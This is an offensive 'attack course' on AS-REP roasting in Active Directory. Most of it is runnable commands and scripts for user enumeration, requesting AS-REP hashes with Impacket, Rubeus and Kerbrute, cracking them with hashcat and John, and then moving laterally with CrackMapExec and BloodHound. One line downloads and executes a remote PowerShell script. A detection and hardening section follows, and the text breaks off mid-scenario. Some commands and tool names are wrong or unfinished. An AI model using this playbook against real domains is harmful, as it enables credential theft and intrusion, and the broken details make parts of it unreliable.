# AS-REP Roasting: Complete Attack Course

## Table of Contents
1. Introduction to AS-REP Roasting
2. Kerberos Authentication Fundamentals
3. Technical Details of AS-REP Roasting
4. What Causes AS-REP Roastable Accounts
5. Reconnaissance and Target Identification
6. Exploitation Techniques and Tools
7. Hash Cracking and Analysis
8. Post-Exploitation Considerations
9. Detection and Defensive Measures
10. Real-World Scenarios and Case Studies

---

## 1. Introduction to AS-REP Roasting

### What is AS-REP Roasting?

AS-REP Roasting is a post-exploitation technique that targets user accounts configured with "Do not require Kerberos preauthentication" in Active Directory environments. This attack allows attackers to request encrypted AS-REP (Authentication Server Response) messages for vulnerable users without needing their passwords, then crack these hashes offline to recover plaintext credentials.

### Attack Classification

**Attack Type**: Credential Access (MITRE ATT&CK T1558.004)
**Prerequisites**: 
- Domain network access
- Knowledge of vulnerable usernames
- No authentication required for initial request

**Impact Level**: High - Can lead to account compromise and lateral movement

### Why AS-REP Roasting is Significant

**Key Advantages for Attackers:**
- No authentication required to obtain hashes
- Offline cracking prevents detection during attack
- Often overlooked in security assessments
- Can be performed from any domain-joined machine
- Useful for initial foothold or privilege escalation

**Common Scenarios:**
- Initial access when no credentials are available
- Escalation after gaining network access
- Targeting service accounts with weak passwords
- Legacy applications requiring pre-authentication disabled

---

## 2. Kerberos Authentication Fundamentals

### Standard Kerberos Pre-Authentication Flow

Understanding normal Kerberos authentication helps explain why AS-REP Roasting works.

#### Step 1: Authentication Server Request (AS-REQ)
```
Client → KDC: "I want to authenticate as user@domain.com"
Includes: Username, timestamp encrypted with user's password hash
```

#### Step 2: Authentication Server Response (AS-REP)
```
KDC → Client: TGT encrypted with user's password hash
Contains: Session key, TGT for future service requests
```

### Pre-Authentication Purpose

**Security Benefits:**
- Prevents offline password attacks
- Validates client knowledge of password before issuing TGT
- Protects against replay attacks using timestamps
- Ensures only legitimate users receive TGTs

**Pre-Authentication Process:**
1. Client generates timestamp
2. Encrypts timestamp with user's password hash (AS-REQ)
3. KDC decrypts and validates timestamp
4. If valid, KDC issues TGT in AS-REP

### When Pre-Authentication is Disabled

**Modified Flow:**
```
Client → KDC: "I want to authenticate as user@domain.com"
(No encrypted timestamp required)

KDC → Client: AS-REP with encrypted portion
(Encrypted with user's password hash)
```

**The Vulnerability:**
The AS-REP contains data encrypted with the user's password hash, but since no pre-authentication was required, an attacker can request this without knowing the password.

---

## 3. Technical Details of AS-REP Roasting

### AS-REP Message Structure

The AS-REP response contains several components:

```
AS-REP Message:
├── Protocol Version
├── Message Type (AS-REP)
├── Pre-authentication Data (empty when disabled)
├── Client Realm
├── Client Name
├── Ticket (TGT)
└── Encrypted Part ← This contains the crackable hash
    ├── Session Key
    ├── Key Expiration
    ├── Flags
    └── Authorization Data
```

### Encryption Details

**Hash Format:**
```
$krb5asrep$<encryption_type>$<username>@<domain>$<salt>$<hash>
```

**Common Encryption Types:**
- **Type 17**: AES128-CTS-HMAC-SHA1-96
- **Type 18**: AES256-CTS-HMAC-SHA1-96  
- **Type 23**: RC4-HMAC (most common)

**Example Hash:**
```
$krb5asrep$23$john.doe@COMPANY.COM:$5e3ab124...89af2$3c4dd0...7f8a2
```

### Cryptographic Weakness

**The Attack Vector:**
1. AS-REP contains session key encrypted with user's password hash
2. Attacker can request AS-REP without authentication
3. Offline brute-force attack attempts to decrypt session key
4. Successful decryption reveals the user's password

**Why This Works:**
- The same password hash that would be used for pre-authentication is used to encrypt the AS-REP
- Attacker can validate password guesses by attempting decryption
- No network communication needed during cracking phase

---

## 4. What Causes AS-REP Roastable Accounts

### Account Configuration

**Primary Cause:**
The "Do not require Kerberos preauthentication" checkbox is enabled in the user's Active Directory properties.

**Location in Active Directory:**
```
User Properties → Account Tab → Account Options:
☑ Do not require Kerberos preauthentication
```

**PowerShell Check:**
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

### Common Reasons for Disabled Pre-Authentication

#### Legacy Application Compatibility
**Scenarios:**
- Older applications that don't support modern Kerberos
- Custom applications with limited authentication capabilities
- Legacy Unix/Linux systems integrated with AD
- Embedded systems or IoT devices

#### Service Account Requirements
**Examples:**
- Automated backup services
- Monitoring applications
- Legacy database connections
- Third-party software integrations

#### Migration Issues
**Common Situations:**
- Migration from older authentication systems
- Temporary workarounds that become permanent
- Import scripts that set incorrect flags
- Bulk account creation with wrong templates

#### Administrative Convenience
**Problematic Practices:**
- Disabling pre-auth to "fix" authentication issues
- Temporary troubleshooting that's never reverted
- Misunderstanding of security implications
- Copy-paste configuration errors

### Identification in AD

#### LDAP Query for Vulnerable Accounts
```ldap
(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```

#### PowerShell Enumeration
```powershell
# Find pre-auth disabled accounts
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties Name,DoesNotRequirePreAuth,LastLogonDate

# Check specific user
Get-ADUser username -Properties DoesNotRequirePreAuth | Select Name,DoesNotRequirePreAuth
```

#### Command Line Query
```cmd
# Using dsquery
dsquery user -o samid | dsget user -samid -mustchpwd -disabled -pwdneverexpires -desc
```

---

## 5. Reconnaissance and Target Identification

### Passive Enumeration Techniques

#### DNS Enumeration
```bash
# Identify domain controllers
nslookup -type=SRV _ldap._tcp.dc._msdcs.company.com
dig _ldap._tcp.dc._msdcs.company.com SRV

# Find Kerberos services
nslookup -type=SRV _kerberos._tcp.company.com
```

#### SMB/NetBIOS Enumeration
```bash
# enum4linux - comprehensive enumeration
enum4linux -a dc.company.com

# SMB null session enumeration
smbclient -L //dc.company.com -N
rpcclient -U "" -N dc.company.com
```

### Active Directory User Enumeration

#### Unauthenticated Enumeration
```bash
# Using rpcclient (if null sessions allowed)
rpcclient -U "" -N dc.company.com
rpcclient $> enumdomusers
rpcclient $> queryuser 0x1f4  # Administrator RID
rpcclient $> queryuser 0x1f5  # Guest RID
```

#### Authenticated Enumeration
```powershell
# PowerShell AD Module
Get-ADUser -Filter * | Select Name,SamAccountName,Enabled

# PowerView
Get-DomainUser | Select name,samaccountname,description

# LDAP queries
([adsisearcher]"(&(objectCategory=person)(objectClass=user))").FindAll()
```

### Username Generation Techniques

#### Common Username Formats
```
# Common patterns to test
john.doe
jdoe
j.doe
johndoe
john_doe
doej
doejon
john.doe2024
```

#### OSINT for Username Discovery
**Sources:**
- Company LinkedIn pages
- Employee directories
- Email footers in documents
- Social media profiles
- Company websites and press releases

#### Automated Username Generation
```python
# Example Python script for username generation
def generate_usernames(first_name, last_name):
    usernames = []
    f = first_name.lower()
    l = last_name.lower()
    
    # Common formats
    usernames.extend([
        f"{f}.{l}",           # john.doe
        f"{f}{l}",            # johndoe
        f"{f}_{l}",           # john_doe
        f"{f[0]}{l}",         # jdoe
        f"{f}.{l[0]}",        # john.d
        f"{f[0]}.{l}",        # j.doe
        f"{l}{f[0]}",         # doej
        f"{l}.{f}",           # doe.john
    ])
    
    return list(set(usernames))
```

---

## 6. Exploitation Techniques and Tools

### Linux-Based Tools

#### Impacket GetNPUsers.py
**Basic Usage:**
```bash
# Domain user enumeration without authentication
GetNPUsers.py company.com/ -usersfile users.txt -format hashcat -outputfile hashes.txt

# With domain credentials for better enumeration
GetNPUsers.py company.com/username:password -request -format hashcat -outputfile hashes.txt

# Target specific user
GetNPUsers.py company.com/ -no-pass -usersfile single_user.txt
```

**Advanced Options:**
```bash
# Custom DC and different output formats
GetNPUsers.py company.com/ -usersfile users.txt -dc-ip 192.168.1.10 -format john

# Using Kerberos authentication
GetNPUsers.py company.com/username -k -no-pass -dc-ip dc.company.com
```

#### Kerbrute for User Enumeration
```bash
# Install kerbrute
go install github.com/ropnop/kerbrute@latest

# Username enumeration
kerbrute userenum --dc dc.company.com -d company.com users.txt

# AS-REP roasting specific users
kerbrute userenum --dc dc.company.com -d company.com --downgrade users.txt
```

#### Custom Python Scripts
```python
#!/usr/bin/env python3
import socket
from impacket.krb5.kerberosv5 import KerberosError
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, AS_REP, seq_set, seq_set_iter
from impacket.krb5.types import KerberosTime, Principal

def request_asrep(username, domain, dc_ip):
    try:
        # Build AS-REQ without pre-authentication
        clientName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        
        asReq = AS_REQ()
        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
        asReq['req-body'] = seq_set(AS_REQ, 'req-body')
        asReq['req-body']['kdc-options'] = constants.encodeFlags(constants.KDCOptions.forwardable.value)
        asReq['req-body']['cname'] = clientName.components_to_asn1(asReq)
        asReq['req-body']['realm'] = domain
        asReq['req-body']['sname'] = serverName.components_to_asn1(asReq)
        asReq['req-body']['till'] = KerberosTime.to_asn1(datetime.datetime(2037, 12, 31, 23, 59, 59))
        asReq['req-body']['rtime'] = KerberosTime.to_asn1(datetime.datetime(2037, 12, 31, 23, 59, 59))
        asReq['req-body']['nonce'] = random.getrandbits(31)
        asReq['req-body']['etype'] = (int(constants.EncryptionTypes.rc4_hmac.value),)
        
        # Send request and capture response
        # Implementation details...
        
    except KerberosError as e:
        if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
            print(f"[+] {username} requires pre-authentication (not vulnerable)")
        else:
            print(f"[+] {username} - AS-REP hash obtained!")
```

### Windows-Based Tools

#### Rubeus
**Basic AS-REP Roasting:**
```cmd
# AS-REP roast all vulnerable users
Rubeus.exe asreproast /outfile:hashes.txt

# Target specific user
Rubeus.exe asreproast /user:username /outfile:hash.txt

# Custom domain controller
Rubeus.exe asreproast /dc:dc.company.com /outfile:hashes.txt
```

**Advanced Usage:**
```cmd
# Different output formats
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
Rubeus.exe asreproast /format:john /outfile:hashes.txt

# Use existing TGT for authentication
Rubeus.exe asreproast /ticket:base64_tgt_here

# LDAP path specification
Rubeus.exe asreproast /ldapfilter:"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
```

#### PowerShell Scripts
```powershell
# PowerView AS-REP roasting
Import-Module PowerView.ps1
Get-DomainUser -PreauthNotRequired | Get-DomainSPNTicket -Format Hashcat

# Custom PowerShell function
function Invoke-ASREPRoast {
    param(
        [string]$Domain = $env:USERDNSDOMAIN,
        [string]$DomainController,
        [string[]]$Users
    )
    
    if ($Users) {
        foreach ($User in $Users) {
            # Request AS-REP for specific user
            $AsReq = New-Object System.DirectoryServices.Protocols.SearchRequest
            # Implementation...
        }
    } else {
        # Enumerate all vulnerable users
        $Searcher = [adsisearcher]"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
        $Searcher.SearchRoot = "LDAP://$Domain"
        # Implementation...
    }
}
```

#### ASREPRoast.ps1
```powershell
# Standalone script for AS-REP roasting
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1')

# Basic execution
Invoke-ASREPRoast

# Output to file
Invoke-ASREPRoast | Out-File -Encoding ASCII hashes.txt

# Target specific domain
Invoke-ASREPRoast -Domain company.com
```

### Automation and Scripting

#### Bash Script for Multiple Domains
```bash
#!/bin/bash

domains=("company.com" "subsidiary.com" "partner.com")
userlist="users.txt"

for domain in "${domains[@]}"; do
    echo "[*] Testing domain: $domain"
    
    # Get domain controller
    dc=$(nslookup -type=SRV _ldap._tcp.dc._msdcs.$domain | grep -oP '(?<=target: )[^.]+')
    
    if [ ! -z "$dc" ]; then
        echo "[+] Found DC: $dc.$domain"
        
        # Perform AS-REP roasting
        GetNPUsers.py $domain/ -usersfile $userlist -format hashcat -outputfile ${domain}_hashes.txt
    fi
done
```

#### Python Automation Framework
```python
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor

class ASREPRoaster:
    def __init__(self, domain, dc_ip=None, userlist=None):
        self.domain = domain
        self.dc_ip = dc_ip
        self.userlist = userlist
        self.results = []
    
    def enumerate_users(self):
        """Enumerate domain users"""
        cmd = f"GetNPUsers.py {self.domain}/ -no-pass"
        if self.dc_ip:
            cmd += f" -dc-ip {self.dc_ip}"
        
        # Execute and parse results
        # Implementation...
    
    def roast_user(self, username):
        """Attempt AS-REP roasting for specific user"""
        cmd = f"GetNPUsers.py {self.domain}/ -no-pass -usersfile {username}"
        # Implementation...
    
    def mass_roast(self):
        """Perform mass AS-REP roasting"""
        if self.userlist:
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(self.roast_user, user) for user in self.userlist]
                # Process results...
```

---

## 7. Hash Cracking and Analysis

### Hash Format Analysis

#### Identifying Hash Types
```bash
# Hashcat hash type identification
hashcat --example-hashes | grep -i kerberos
hashcat --example-hashes | grep -i asrep

# Common AS-REP hash modes
# 18200: Kerberos 5, etype 23, AS-REP
# 19600: Kerberos 5, etype 17, TGS-REP
# 19700: Kerberos 5, etype 18, TGS-REP
```

#### Hash Structure Breakdown
```
$krb5asrep$23$username@DOMAIN.COM:$salt$encrypted_data
│          │  │                    │     │
│          │  │                    │     └─ Encrypted portion (contains session key)
│          │  │                    └─ Salt value
│          │  └─ Username and domain
│          └─ Encryption type (23 = RC4-HMAC)
└─ Hash identifier
```

### Hashcat Cracking Techniques

#### Basic Hashcat Commands
```bash
# Dictionary attack with common passwords
hashcat -m 18200 hashes.txt rockyou.txt

# Rule-based attack
hashcat -m 18200 hashes.txt rockyou.txt -r best64.rule

# Mask attack for known password patterns
hashcat -m 18200 hashes.txt -a 3 ?u?l?l?l?l?l?d?d

# Combination attack
hashcat -m 18200 hashes.txt wordlist1.txt wordlist2.txt -a 1
```

#### Advanced Hashcat Strategies
```bash
# Multi-GPU acceleration
hashcat -m 18200 hashes.txt rockyou.txt -O -w 4

# Custom character sets
hashcat -m 18200 hashes.txt -a 3 -1 ?l?u?d CompanyName?1?1?1?1

# Incremental attack with length progression
hashcat -m 18200 hashes.txt -a 3 -i --increment-min=6 --increment-max=12 ?a?a?a?a?a?a

# Resume interrupted sessions
hashcat -m 18200 hashes.txt rockyou.txt --restore
```

#### Optimized Wordlists for Corporate Environments
```bash
# Company-specific wordlist generation
# Include company name, common years, seasons
cat > company_wordlist.txt << EOF
CompanyName2024
CompanyName2023
Company123
Company!
Spring2024
Summer2024
Fall2024
Winter2024
Password123
Welcome123
$(company_name)123
EOF

# Location-based passwords
echo "Dallas2024" >> wordlist.txt
echo "Houston123" >> wordlist.txt
echo "Texas2024" >> wordlist.txt
```

### John the Ripper Alternative

#### Basic John Commands
```bash
# Convert hashcat format to john format
hashcat2john.py hashes.txt > john_hashes.txt

# Dictionary attack
john --wordlist=rockyou.txt john_hashes.txt

# Rule-based cracking
john --wordlist=rockyou.txt --rules=Wordlist john_hashes.txt

# Show cracked passwords
john --show john_hashes.txt
```

#### Custom John Rules
```bash
# Create custom rule for corporate passwords
cat > company.rule << EOF
# Add year suffixes
$2$0$2$4
$2$0$2$3
$2$0$2$2

# Add exclamation marks
$!

# Capitalize first letter and add numbers
c$1$2$3
EOF

# Use custom rules
john --wordlist=base_words.txt --rules=company john_hashes.txt
```

### Cloud-Based Cracking

#### AWS/Google Cloud Setup
```bash
# Launch GPU-enabled instance
# p3.2xlarge (Tesla V100) or p3.8xlarge for multiple GPUs

# Install hashcat
wget https://hashcat.net/files/hashcat-6.2.6.tar.gz
tar -xvf hashcat-6.2.6.tar.gz
cd hashcat-6.2.6
make

# Optimize for cloud cracking
hashcat -m 18200 hashes.txt rockyou.txt -O -w 4 --force
```

#### Distributed Cracking
```bash
# Using hashtopolis for distributed cracking
# Setup multiple workers across different cloud instances
# Coordinate cracking jobs centrally
```

### Password Analysis

#### Pattern Recognition
```python
import re

def analyze_cracked_passwords(passwords):
    patterns = {
        'company_name': 0,
        'year_suffix': 0,
        'exclamation': 0,
        'number_suffix': 0,
        'season_year': 0,
        'welcome_password': 0
    }
    
    for password in passwords:
        if re.search(r'company', password.lower()):
            patterns['company_name'] += 1
        if re.search(r'20\d{2}$', password):
            patterns['year_suffix'] += 1
        if password.endswith('!'):
            patterns['exclamation'] += 1
        if re.search(r'\d+$', password):
            patterns['number_suffix'] += 1
        if re.search(r'(spring|summer|fall|winter)', password.lower()):
            patterns['season_year'] += 1
        if password.lower().startswith('welcome'):
            patterns['welcome_password'] += 1
    
    return patterns
```

---

## 8. Post-Exploitation Considerations

### Credential Validation

#### Testing Cracked Credentials
```bash
# CrackMapExec validation
crackmapexec smb dc.company.com -u username -p password

# WinRM access testing
crackmapexec winrm dc.company.com -u username -p password

# LDAP authentication test
ldapsearch -x -H ldap://dc.company.com -D "username@company.com" -W -b "DC=company,DC=com" "(objectclass=user)"
```

#### Account Enumeration
```powershell
# Check account properties
Get-ADUser username -Properties *

# Check group memberships
Get-ADPrincipalGroupMembership username

# Check login history
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} | Where-Object {$_.Message -like "*$username*"}
```

### Privilege Assessment

#### Local Admin Rights
```bash
# Check local admin access across domain
crackmapexec smb subnet.txt -u username -p password --local-auth

# PowerShell local admin check
Find-LocalAdminAccess -Username username
```

#### Service Account Analysis
```powershell
# Check if account is service account
Get-ADUser username -Properties ServicePrincipalNames

# Find SPNs for Kerberoasting
Get-DomainUser username | Get-DomainSPNTicket
```

### Lateral Movement Planning

#### BloodHound Analysis
```bash
# Collect data with compromised credentials
bloodhound-python -u username -p password -d company.com -gc dc.company.com -c all

# Analyze attack paths
# Import JSON files into BloodHound GUI
# Search for paths from compromised user to high-value targets
```

#### Network Mapping
```bash
# Internal network discovery
nmap -sn 192.168.1.0/24

# Service enumeration on accessible hosts
nmap -sS -sV -O target_hosts.txt
```

---

## 9. Detection and Defensive Measures

### Detection Strategies

#### Event Log Monitoring

**Key Event IDs:**
- **4768**: Kerberos TGT Request (successful)
- **4771**: Kerberos pre-authentication failed
- **4625**: Failed logon attempts

**Detection Queries:**
```xml
<!-- Unusual AS-REQ without pre-auth -->
<QueryList>
  <Query Id="0">
    <Select Path="Security">
      *[System[EventID=4768]] and
      *[EventData[Data[@Name='PreAuthType'] = '0']]
    </Select>
  </Query>
</QueryList>
```

#### PowerShell Detection Script
```powershell
# Monitor for AS-REP roasting attempts
$Events = Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4768
    StartTime=(Get-Date).AddHours(-24)
}

$SuspiciousEvents = $Events | Where-Object {
    $_.Properties[10].Value -eq 0  # PreAuthType = 0 (no pre-auth)
} | Group-Object {$_.Properties[0].Value} | Where-Object {$_.Count -gt 10}

if ($SuspiciousEvents) {
    Write-Warning "Potential AS-REP roasting detected for users: $($SuspiciousEvents.Name -join ', ')"
}
```

#### Network Detection

**Wireshark/TCPDump Filters:**
```bash
# Monitor for AS-REQ without pre-auth
tshark -f "port 88" -Y "kerberos.msg_type == 10 && !kerberos.pa_data"

# High volume of AS-REQ requests
tshark -f "port 88" -Y "kerberos.msg_type == 10" -T fields -e ip.src -e kerberos.cname_string
```

### Preventive Measures

#### Account Hardening
```powershell
# Find and fix vulnerable accounts
$VulnerableUsers = Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}

foreach ($User in $VulnerableUsers) {
    Write-Host "Fixing user: $($User.Name)"
    Set-ADUser $User -DoesNotRequirePreAuth $false
}
```

#### Group Policy Configuration
```
Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options

"Network security: Configure encryption types allowed for Kerberos"
- Disable RC4_HMAC_MD5
- Enable AES128_HMAC_SHA1, AES256_HMAC_SHA1
```

#### Monitoring Implementation
```powershell
# Create scheduled task for monitoring
$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-File C:\Scripts\Monitor-ASREPRoasting.ps1"
$Trigger = New-ScheduledTaskTrigger -Daily -At "09:00AM"
$Settings = New-ScheduledTaskSettingsSet -WakeToRun

Register-ScheduledTask -TaskName "Monitor AS-REP Roasting" -Action $Action -Trigger $Trigger -Settings $Settings
```

### Response Procedures

#### Incident Response Checklist
1. **Immediate Actions:**
   - Identify affected accounts
   - Reset compromised passwords
   - Enable pre-authentication for vulnerable accounts
   - Review recent logon activity

2. **Investigation Steps:**
   - Analyze security logs for attack timeline
   - Check for lateral movement indicators
   - Review network traffic for anomalies
   - Examine compromised systems for persistence

3. **Remediation:**
   - Patch vulnerable configurations
   - Implement additional monitoring
   - Update security awareness training
   - Review privileged account management

#### Automated Response Script
```powershell
function Respond-ToASREPRoasting {
    param([string[]]$CompromisedUsers)
    
    foreach ($User in $CompromisedUsers) {
        Write-Host "Responding to compromise of: $User"
        
        # Reset password
        $NewPassword = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 12 | ForEach-Object {[char]$_})
        Set-ADAccountPassword $User -NewPassword (ConvertTo-SecureString $NewPassword -AsPlainText -Force) -Reset
        
        # Force password change at next logon
        Set-ADUser $User -ChangePasswordAtLogon $true
        
        # Enable pre-authentication
        Set-ADUser $User -DoesNotRequirePreAuth $false
        
        # Revoke all active sessions
        Get-ADComputer -Filter * | ForEach-Object {
            Invoke-Command -ComputerName $_.Name -ScriptBlock {
                quser | Select-String $using:User | ForEach-Object {
                    $SessionId = ($_ -split '\s+')[2]
                    logoff $SessionId
                }
            }
        }
    }
}
```

---

## 10. Real-World Scenarios and Case Studies

### Scenario 1: Legacy Application Integration

**Background:**
A healthcare organization has an older medical records system that requires integration with Active Directory but doesn't support modern Kerberos pre-authentication.

**Configuration Issue:**
```powershell
# Service account configured for legacy app
Set-ADUser svc_medicalapp -DoesNotRequirePreAuth $true
```

**Attack Vector:**
1. Attacker gains network access through phishing
2. Performs network reconnaissance to identify domain
3. Uses GetNPUsers.py to discover vulnerable service account
4. Cracks weak password "MedApp2019!"
5. Uses service account for lateral movement

**Lessons Learned:**
- Legacy systems shouldn't compromise security
- Service accounts need strong, regularly rotated passwords
- Network segmentation can limit blast radius
- Alternative authentication methods should be explored

### Scenario 2: Mass Account Compromise

**Background:**
Financial services company with poor password policies and multiple accounts configured without pre-authentication.

**Initial Discovery:**
```bash
# Attacker enumeration reveals 47 vulnerable accounts
GetNPUsers.py finance.com/ -usersfile discovered_users.txt -format hashcat